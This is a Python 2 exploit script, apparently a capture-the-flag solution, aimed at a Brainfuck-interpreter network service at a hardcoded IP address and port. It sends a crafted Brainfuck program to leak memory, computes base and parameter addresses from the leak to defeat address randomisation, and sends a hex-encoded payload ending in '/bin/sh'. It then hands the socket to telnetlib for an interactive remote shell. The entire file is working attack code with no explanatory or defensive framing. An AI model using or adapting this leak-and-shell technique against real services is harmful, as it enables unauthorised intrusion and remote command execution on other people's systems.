import socket, struct, binascii
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            print "Server disconnected"
            exit()
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            print "Server disconnected"
            exit()
        res += data
        
    return res
    
def x(n):
    return struct.pack("<Q", n)

# sc = socket.create_connection(("10.0.0.52", 12345))
sc = socket.create_connection(("107.170.17.158", 6969))



sc.send(
    "+++++++++++[>++++++++++++<-]>>+>->>++++++++++++++++++++++++++++>------------------------------------>-<<<<<<#" +
    ">>>>>>>>"
    "+++++++++++[>++++++++++++<-]>->>->------------------------------------------------------------------------>+++++++++++++++++++++>------------------------------------>-<<<<<<#" +
    "["
    )

res = sc.recv(0xff)
print binascii.b2a_hex(res)
base = struct.unpack("<I", res[0x40:0x44])[0] - 0x00250f04
print "%08x" % base
parambase = struct.unpack("<I", res[0x2c:0x30])[0] - 0xc
print "%08x" % parambase

arg1 = base + 0x0001253c
arg2 = base + 0x00012534
shellcode = binascii.a2b_hex((
    "000124c8" + ("%08x" % (parambase + 0x04)) + "00000004 0000000b 000124d0" + 
    "000124dc" + ("%08x" % (parambase + 0x08)) + "00000004" + ("%08x" % arg1) + "000124e4" + 
    "000124f0" + ("%08x" % (parambase + 0x0c)) + "00000004" + ("%08x" % arg2) + "000124f8" + 
    "00012504" + ("%08x" % (parambase + 0x10)) + "00000004 00000000 0001250c" + 
    "00012518" + ("%08x" % (parambase + 0x00)) + "00000001 ffffffff 00012520" + 
    "00012520 00012520 00000000 00000000 00012520" +
    ("%08x" % arg1) + "00000000"
    "").replace(" ", ""))
    
data = ""
for i in xrange(0, len(shellcode), 4):
    data += shellcode[i:i+4][::-1]
    
data += "/bin/sh\x00"
sc.send(data)
t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  

# while True:
    # data = sc.recv(16384)
    # if len(data) == 0:
        # break
    # for line in data.split("\n"):
        # print repr(line)
        # print binascii.b2a_hex(line)
    